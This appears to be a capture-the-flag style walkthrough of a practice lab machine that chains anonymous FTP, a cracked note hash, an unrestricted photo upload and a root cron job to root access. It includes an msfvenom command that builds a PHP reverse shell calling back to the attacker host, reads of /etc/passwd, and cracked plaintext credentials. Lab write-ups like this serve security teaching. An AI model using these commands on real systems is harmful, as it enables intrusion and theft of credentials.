## Machine Info

IP: 192.168.56.104

## Enumeration

```
$ nmap -A -T4 192.168.56.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 12:17 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00092s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:2B:0D:ED (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.56.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds

```

### FTP

Anonymous login to grab note.txt

```
└─$ ftp anonymous@192.168.56.104
Connected to 192.168.56.104.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63890|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||16765|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*******************************************************************************************************|   776        2.12 MiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (459.00 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                   
  
```

Contents of note.txt:

```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

Cracked the hash:

![image.png](images/image (1).png)

Creds from the note

10201321 : student

### HTTP

Dirsearch results:

```
$ dirsearch -u 192.168.56.104
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/TCM/Academy/reports/_192.168.56.104/_24-10-22_12-34-30.txt

Target: http://192.168.56.104/

[12:34:30] Starting:                                                                                                                                
[12:34:32] 403 -  279B  - /.htaccess.orig                                   
[12:34:32] 403 -  279B  - /.htaccess.bak1
[12:34:32] 403 -  279B  - /.ht_wsr.txt                                      
[12:34:32] 403 -  279B  - /.htaccess.sample
[12:34:32] 403 -  279B  - /.html                                            
[12:34:32] 403 -  279B  - /.htaccess_orig
[12:34:32] 403 -  279B  - /.htaccessBAK
[12:34:32] 403 -  279B  - /.htaccessOLD
[12:34:32] 403 -  279B  - /.htaccess_extra                                  
[12:34:32] 403 -  279B  - /.htaccessOLD2                                    
[12:34:32] 403 -  279B  - /.htaccess_sc                                     
[12:34:32] 403 -  279B  - /.htaccess.save
[12:34:32] 403 -  279B  - /.htm                                             
[12:34:32] 403 -  279B  - /.htpasswds                                       
[12:34:32] 403 -  279B  - /.htpasswd_test
[12:34:33] 403 -  279B  - /.httr-oauth                                      
[12:34:34] 403 -  279B  - /.php                                             
[12:35:14] 301 -  321B  - /phpmyadmin  ->  http://192.168.56.104/phpmyadmin/
[12:35:15] 200 -   17KB - /phpmyadmin/ChangeLog                             
[12:35:15] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[12:35:15] 200 -    1KB - /phpmyadmin/README                                
[12:35:15] 200 -    3KB - /phpmyadmin/index.php                             
[12:35:15] 200 -    3KB - /phpmyadmin/                                      
[12:35:21] 403 -  279B  - /server-status                                    
[12:35:21] 403 -  279B  - /server-status/                                   
                                                                             
Task Completed
```

Credentials don’t work for phpmyadmin login. Browse to 192.168.56.104/academy based on note info. Find student login.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/9dd06479-4067-4d69-979a-660f8ec5cfd2/image.png)

Can upload new profile photo and it seems to allow any file type:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/61bb91b2-0030-4f13-9c93-a7f96a10a068/image.png)

And can browse to uploaded file:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/186bc7f7-23a8-45d3-9bd9-c897cbd4fd59/image.png)

I generated a php reverse shell file with this command:

```
$ msfvenom -p php/reverse_php LHOST=192.168.56.102 LPORT=6000 -f raw > payload.php
```

Then uploaded it and refreshed the page to get a nc connection.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/92c17861-8862-4d1b-8791-af0a37aa2fef/image.png)

/etc/passwd shows the users on the machine

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash

```

I could also upload [linpeas.sh](http://linpeas.sh) through the upload function. After running, it found a mysql password:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/43151b04-d38d-4102-9a90-80a412a16f8a/image.png)

I’ll try logging into the server via SSH with this password and user grimmie

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/5a4d09fa-b6ad-4ec1-825e-7a18b2f6b7df/image.png)

I decided to connect to the mysql database with this command (no space between -p and the password is intentional):

```
mysql -u grimmie -pMy_V3ryS3cur3_P4ss -h localhost onlinecourse 
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/5fa1c183-547b-40ac-9da5-4b103a205013/image.png)

Admin password found for web app:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/4e85d35d-f843-4ec7-a4eb-ebfd14deb7e1/image.png)

admin:21232f297a57a5a743894a0e4a801fc3

And the hash is ‘admin’.

So admin creds are admin:admin.

Admin on web app:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/630cae73-bf50-4f5f-ba6b-929627aed7f7/image.png)

And I just realized I could access the mysql database through the web app with the creds found earlier:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/49a52304-4d74-4c86-b1c9-99c072f2ee21/image.png)

And found the root user password in the user db:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/0af1d7b3-e735-4301-a287-8ed4ba557d40/image.png)

And cracked the hash:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/828b942e-db32-4d24-9b4e-c718d2d8ee83/image.png)

root:26021997

However, ssh isn’t working with these credentials. Will try another avenue.

Found file running as root cronjob

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/bba9765f-5dfe-4bbe-8dcb-480bd0f1b705/image.png)

Edited file to give reverse shell:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/3d7ff075-07d1-4224-9f59-a57f2c0dc76d/image.png)

And got root shell:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/024ebeea-a148-4429-aa0c-0035e0cc737e/image.png)
